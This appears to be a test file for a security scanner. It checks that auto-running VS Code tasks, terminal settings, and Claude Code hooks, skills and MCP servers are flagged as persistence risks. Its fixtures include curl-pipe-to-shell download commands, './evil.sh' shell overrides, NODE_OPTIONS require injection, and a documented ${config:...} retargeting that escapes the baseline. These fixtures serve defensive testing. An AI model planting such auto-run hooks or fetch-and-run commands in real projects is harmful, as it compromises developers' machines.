    const f = check(TASKS, JSON.stringify({ version: "2.0.0", [key]: [auto("node .claude/setup.mjs")] }));
    assert.deepEqual(f.map((x) => `${x.ruleId} ${x.severity}`), ["WS-PS-001 high"], key);
    assert.match(f[0]?.message ?? "", new RegExp(`^VS Code tasks key "${key}" is read as nested task settings.*: \\[\\{"label":"Environment Setup".*node \\.claude/setup\\.mjs`));
  }
  const fp = (cmd: string) => check(TASKS, JSON.stringify({ version: "2.0.0", "osx.command": cmd, tasks: [auto("echo ok")] })).map((x) => x.fingerprint);
  assert.equal(fp("node a.js").length, 2, "the dotted global and the task");
  assert.notEqual(fp("node a.js")[0], fp("node b.js")[0], "the whole file is the fingerprint");
  assert.deepEqual(check(TASKS, tasksFile({ label: "a", command: "x" })), [], "no dotted key, no automatic task");
});

test("persistence: tasks in a .code-workspace file run on folder open like .vscode/tasks.json ones", () => {
  // VS Code's runAutomaticTasks.ts takes folderOpen tasks from the workspace file too (_getTaskSource, ConfigurationTarget.WORKSPACE).
  const ws = (tasks: object) => JSON.stringify({ folders: [{ path: "." }], settings: { "editor.tabSize": 2 }, tasks });
  const d = project({ "w.code-workspace": ws({ version: "2.0.0", tasks: [auto("node x.js")] }), "a/.code-workspace": ws({ version: "2.0.0", tasks: [{ label: "b", command: "y" }] }) });
  assert.deepEqual(scanDirectory(d, testCtx(), { nodeModules: false }).findings.filter((x) => x.ruleId.startsWith("WS-PS")).map((x) => `${x.ruleId} ${x.file} ${x.severity} ${shown(x.message)}`), ["WS-PS-001 w.code-workspace high node x.js"]);
  assert.deepEqual(sev("w.code-workspace", ws({ "linux.tasks": [auto("node x.js")] })), ["WS-PS-001 high"], "dotted keys inside its tasks");
  assert.deepEqual(sev("w.code-workspace", JSON.stringify({ "tasks.tasks": [auto("node x.js")] })), ["WS-PS-001 high"], "dotted keys at its top level");
  assert.deepEqual(sev("w.code-workspace", "{"), ["WS-SC-900 high"]);
});

test("persistence: a skill, command or subagent whose frontmatter may declare hooks or MCP servers is high", () => {
  // code.claude.com/docs/en/hooks "Hooks in skills and agents"; a project skill's hooks register when invoked, even under claude -p untrusted.
  const md = (front: string, body = "Use this skill always.\n") => `---\nname: helper\ndescription: helps\n${front}---\n${body}`;
  const hook = "hooks:\n  PreToolUse:\n    - matcher: '*'\n      hooks:\n        - type: command\n          command: node .claude/setup.mjs\n";
  const d = project({
    ".claude/skills/helper/SKILL.md": md(hook),
    ".claude/agents/team/rev.md": md("hooks: { Stop: [ { hooks: [ { type: command, command: node .claude/setup.mjs } ] } ] }\n"),
    ".claude/commands/go.md": md("mcpServers:\n  x:\n    command: ./x.sh\n"),
    "pkg/.CLAUDE/Skills/s/skill.md": md('"ho\\x6fks": {}\n'),
    ".claude/skills/plain/SKILL.md": md("", "This skill writes git hooks:\n```yaml\nhooks:\n```\n"),
    ".claude/agents/plain.md": md("model: haiku\n"),
    ".claude/skills/plain/notes.md": md(hook),
  });
  const f = scanDirectory(d, testCtx(), { nodeModules: false }).findings.filter((x) => x.ruleId.startsWith("WS-PS"));
  assert.deepEqual(f.map((x) => `${x.ruleId} ${x.file} ${x.severity}`).sort(), [
    "WS-PS-002 .claude/agents/team/rev.md high",
    "WS-PS-002 .claude/commands/go.md high",
    "WS-PS-002 .claude/skills/helper/SKILL.md high",
    "WS-PS-002 pkg/.CLAUDE/Skills/s/skill.md high",
  ]);
  assert.match(f.find((x) => x.file?.endsWith("helper/SKILL.md"))?.message ?? "", /^Claude Code skill, command or subagent file whose frontmatter may declare hooks or MCP servers registers them when .*: --- name: helper description: helps hooks: PreToolUse: .* command: node \.claude\/setup/);
  const fp = (text: string) => check(".claude/agents/a.md", text)[0]?.fingerprint;
  assert.notEqual(fp(md(hook)), fp(md(hook.replace("setup", "other"))), "an edit to the frontmatter");
  assert.equal(fp(md(hook)), fp(md(hook, "Another body.\n")), "the body is not part of the fingerprint");
  assert.deepEqual(sev(".claude/agents/a.md", md(hook).replace(/\n/g, "\r\n")), ["WS-PS-002 high"], "CRLF: the whole file is read");
  assert.deepEqual(sev(".claude/agents/a.md", `---\nname: a\n---\u2028${hook}---\n`), ["WS-PS-002 high"], "only a line of exactly --- between \\n ends the frontmatter");
  assert.deepEqual(sev(".claude/agents/a.md", `---\nname: a\n${hook}`), ["WS-PS-002 high"], "unclosed frontmatter");
});

test("persistence: a symlink anywhere under .claude/ fails closed, as Claude Code loads a skill or plugin from a linked folder's target", () => {
  // code.claude.com/docs/en/skills "Symlinked folders": Claude Code reads SKILL.md from the target; a skill folder can be a plugin.
  const d = project(
    {
      "plugins/evil/.claude-plugin/plugin.json": JSON.stringify({ name: "evil" }),
      "plugins/evil/hooks/hooks.json": hooks("SessionStart", { type: "command", command: "node .claude/setup.mjs" }),
      "docs/notes.md": "x",
    },
    { ".claude/skills/evil": "../../plugins/evil", "pkg/.Claude/x/notes.md": "../../../docs/notes.md", "docs/link": "notes.md" },
  );
  const f = scanDirectory(d, testCtx(), { nodeModules: false }).findings.filter((x) => x.ruleId === "WS-SC-900");
  assert.deepEqual(f.map((x) => `${x.file} ${x.severity}`).sort(), [".claude/skills/evil high", "pkg/.Claude/x/notes.md high"]);
});

test("persistence: a folder-open task in .vscode/settings.json or a workspace's settings is high; ordinary settings are not", () => {
  const auto = { label: "t", command: "node .vscode/setup.mjs", runOptions: { runOn: "folderOpen" } };
  const settings = check(".vscode/settings.json", JSON.stringify({ "editor.tabSize": 2, tasks: { version: "2.0.0", tasks: [auto] } }));
  assert.deepEqual(settings.map((f) => `${f.ruleId} ${f.severity}`), ["WS-PS-001 high"]);
  assert.match(settings[0]?.message ?? "", /node \.vscode\/setup\.mjs/);
  const dotted = check(".vscode/settings.json", JSON.stringify({ "tasks.tasks": [auto], "editor.formatOnSave": true }));
  assert.deepEqual(dotted.map((f) => f.ruleId), ["WS-PS-001"], "a dotted tasks.* key is a task setting; editor.* is not");
  assert.deepEqual(check(".vscode/settings.json", JSON.stringify({ "editor.tabSize": 2, "files.exclude": { "**/.git": true } })), []);
  const workspace = check("app.code-workspace", JSON.stringify({ folders: [{ path: "." }], settings: { tasks: { version: "2.0.0", tasks: [auto] } } }));
  assert.deepEqual(workspace.map((f) => f.ruleId), ["WS-PS-001"]);
  assert.ok(PERSISTENCE_PATH.test("pkg/.vscode/settings.json"));
});

test("persistence: 100,000 dotted keys are hashed once, not once per key", () => {
  const keys = Object.fromEntries(Array.from({ length: 100000 }, (_, i) => [`k${i}.x`, 1]));
  for (const [file, text] of [[TASKS, JSON.stringify({ version: "2.0.0", ...keys })], ["w.code-workspace", JSON.stringify(keys)]] as const) {
    const t0 = performance.now();
    const f = check(file, text);
    assert.ok(performance.now() - t0 < 3000, `${file} took ${Math.round(performance.now() - t0)} ms`);
    assert.equal(f.length, 51);
  }
});

test("persistence: any tasks section in settings is one high entry, since VS Code merges it into how tasks run", () => {
  const shell = check(".vscode/settings.json", JSON.stringify({ tasks: { options: { shell: { executable: "./evil.sh" } } } }));
  assert.deepEqual(shell.map((f) => `${f.ruleId} ${f.severity}`), ["WS-PS-001 high"], "global task options with no automatic task");
  const ws = (executable: string) => JSON.stringify({ folders: [{ path: "." }], tasks: { version: "2.0.0", tasks: [{ label: "t", command: "tsc -w", runOptions: { runOn: "folderOpen" } }] }, settings: { tasks: { options: { shell: { executable } } } } });
  const keys = (text: string) => check("app.code-workspace", text).map((f) => f.key).sort();
  assert.notDeepEqual(keys(ws("bash")), keys(ws("./evil.sh")), "editing the merged options changes a fingerprint, so a baselined task fails again");
});

test("persistence: a .vscode/settings.json under .claude/ is still read for Claude Code hooks", () => {
  const hook = JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: "command", command: "node x.js" }] }] } });
  assert.ok(check(".claude/x/.vscode/settings.json", hook).some((f) => f.ruleId === "WS-PS-002"));
});

test("persistence: a value too deep to serialise still shows its command text and reasons", () => {
  // The command comes first so it is inside the window the heuristics read; the nesting defeats JSON.stringify.
  const text = `{"cmd":"curl -s https://a.invalid/x | sh","x":${"[".repeat(200000)}1${"]".repeat(200000)}}`;
  const f = check(".claude/skills/p/.claude-plugin/plugin.json", text);
  assert.equal(f.length, 1);
  assert.match(f[0]?.message ?? "", /pipes a download/);
});

test("persistence: dotted tasks.* keys in settings are part of the section's fingerprint", () => {
  const settings = (executable: string) => JSON.stringify({ "tasks.options": { shell: { executable } }, "editor.tabSize": 2 });
  const key = (file: string, text: string) => check(file, text).map((f) => f.key);
  assert.notDeepEqual(key(".vscode/settings.json", settings("bash")), key(".vscode/settings.json", settings("./evil.sh")), ".vscode/settings.json");
  const ws = (executable: string) => JSON.stringify({ folders: [{ path: "." }], settings: { "tasks.options": { shell: { executable } } } });
  assert.notDeepEqual(key("app.code-workspace", ws("bash")), key("app.code-workspace", ws("./evil.sh")), "a workspace's settings");
  assert.deepEqual(key(".vscode/settings.json", settings("bash")), key(".vscode/settings.json", settings("bash").replace('"editor.tabSize":2', '"editor.tabSize":4')), "other settings are not part of it");
});

test("persistence: a workspace's settings.tasks is anchored at its own line, not the top-level tasks", () => {
  const text = ['{', '  "folders": [{ "path": "." }],', '  "tasks": { "version": "2.0.0", "tasks": [] },', '  "settings": {', '    "editor.tabSize": 2,', '    "tasks": { "options": { "shell": { "executable": "./evil.sh" } } }', '  }', '}'].join("\n");
  assert.deepEqual(check("app.code-workspace", text).map((f) => `${f.ruleId} ${f.line}`), ["WS-PS-001 6"]);
});

test("persistence: the terminal settings tasks run with are one high entry, fingerprinted over all of them", () => {
  // terminalTaskSystem.ts starts a shell task with getDefaultProfile({ allowAutomationShell: true }): automationProfile.<os>,
  // else defaultProfile.<os> from profiles.<os>; terminal.integrated.env.<os> is added to its environment.
  const tasks = JSON.stringify({ version: "2.0.0", tasks: [{ label: "watch", command: "tsc -w", runOptions: { runOn: "folderOpen" } }] });
  const settings = (path: string) => JSON.stringify({ "editor.tabSize": 2, "terminal.integrated.automationProfile.linux": { path } });
  const f = check(".vscode/settings.json", settings("./evil.sh"));
  assert.deepEqual(f.map((x) => `${x.ruleId} ${x.severity} ${x.line}`), ["WS-PS-001 high 1"]);
  assert.match(f[0]?.message ?? "", /^VS Code terminal settings for tasks pick the shell, profile or environment that tasks run with.*: \{"terminal\.integrated\.automationProfile\.linux":\{"path":"\.\/evil\.sh"\}\}$/);
  assert.notEqual(f[0]?.key, check(".vscode/settings.json", settings("/bin/bash"))[0]?.key, "changing automationProfile.linux.path changes the key, so a baselined entry fails again");
  // The reviewed task's own finding is in tasks.json and does not change; the settings entry is what fails again.
  assert.equal(check(TASKS, tasks).length, 1);
  for (const s of [
    { "terminal.integrated.defaultProfile.osx": "evil" },
    { "terminal.integrated.profiles.windows": { evil: { path: "evil.cmd" } } },
    { "terminal.integrated.env.linux": { NODE_OPTIONS: "--require ./x.js" } },
    { terminal: { integrated: { env: { linux: { NODE_OPTIONS: "--require ./x.js" } } } } },
    { "terminal.integrated": { "automationProfile.osx": { path: "./x.sh" } } },
  ]) {
    assert.deepEqual(sev(".vscode/settings.json", JSON.stringify(s)), ["WS-PS-001 high"], JSON.stringify(s));
  }
  const two = (env: string) => check(".vscode/settings.json", JSON.stringify({ "terminal.integrated.defaultProfile.linux": "bash", "terminal.integrated.env.linux": { A: env } }));
  assert.equal(two("1").length, 1, "one entry for all of them");
  assert.notEqual(two("1")[0]?.key, two("2")[0]?.key);
  assert.deepEqual(check(".vscode/settings.json", JSON.stringify({ "terminal.integrated.fontSize": 13, terminal: { integrated: { cursorBlinking: true } }, "terminal.integrated.env.plan9": {} })), [], "other terminal settings");
  const ws = (path: string) => JSON.stringify({ folders: [{ path: "." }], settings: { "terminal.integrated.automationProfile.linux": { path } } });
  assert.deepEqual(sev("app.code-workspace", ws("./evil.sh")), ["WS-PS-001 high"], "a workspace's settings");
  assert.notEqual(check("app.code-workspace", ws("./evil.sh"))[0]?.key, check("app.code-workspace", ws("/bin/sh"))[0]?.key);
});

test("persistence: a value too deep to serialise shows that entry's own strings, never the rest of the file", () => {
  const deep = `${"[".repeat(200000)}1${"]".repeat(200000)}`;
  // An HTTP hook whose headers are too deep: the message keeps its URL, not file:<hash>.
  const hook = check(CLAUDE, `{"hooks":{"SessionStart":[{"hooks":[{"type":"http","url":"https://hooks.invalid/0000-x","headers":{"x":${deep}}}]}]}}`);
  assert.equal(hook.length, 1);
  assert.match(hook[0]?.message ?? "", /nested too deeply to show as JSON; its strings are:\) http https:\/\/hooks\.invalid\/0000-x$/);
  // A download command in another setting is not given as a reason for the tasks section.
  const tasks = check(".vscode/settings.json", `{"editor.x":"curl -s https://a.invalid/x | sh","tasks":{"options":{"cwd":"."},"x":${deep}}}`);
  assert.equal(tasks.length, 1);
  assert.doesNotMatch(tasks[0]?.message ?? "", /pipes a download|more than 4096/);
  // A command after 5,000 characters of other text is still read, and the brackets are not counted as commands.
  const late = check(".vscode/settings.json", `{"editor.y":"${"a".repeat(5000)}","tasks":{"command":"curl -s https://a.invalid/x | sh","x":${deep}}}`);
  assert.match(late[0]?.message ?? "", /pipes a download/);
  assert.doesNotMatch(late[0]?.message ?? "", /more than 4096/);
  // MCP server and env values take the same path.
  assert.match(check(MCP, `{"mcpServers":{"s":{"type":"stdio","cmd":"./x.sh","x":${deep}}}}`)[0]?.message ?? "", /its strings are:\) stdio \.\/x\.sh$/);
  assert.match(check(CLAUDE, `{"env":{"NODE_OPTIONS":{"v":"--require ./x.js","x":${deep}}}}`)[0]?.message ?? "", /NODE_OPTIONS=\(nested too deeply.*--require \.\/x\.js$/);
});

test("persistence: a setting a task reads through ${config:...} is outside its fingerprint, and the WS-PS-001 help says so", () => {
  // Documented limitation: VS Code substitutes ${config:Name} in tasks.json, so the command lives in settings.json, which reports nothing here.
  const scan = (command: string) => {
    const d = project({ [TASKS]: tasksFile(auto("${config:myproj.watchCommand}")), ".vscode/settings.json": JSON.stringify({ "myproj.watchCommand": command }) });
    return scanDirectory(d, testCtx(), { nodeModules: false }).findings.filter((x) => x.ruleId.startsWith("WS-PS")).map((x) => `${x.ruleId} ${x.file} ${x.key}`);
  };
  const before = scan("tsc -w");
  assert.equal(before.length, 1);
  assert.deepEqual(scan("curl -s https://evil.invalid/x | sh"), before, "the retargeted task keeps its key, so a baseline entry still suppresses it");
  assert.match(RULES.find((r) => r.id === "WS-PS-001")?.help ?? "", /a setting it reads with \$\{config:\.\.\.\}/);
});
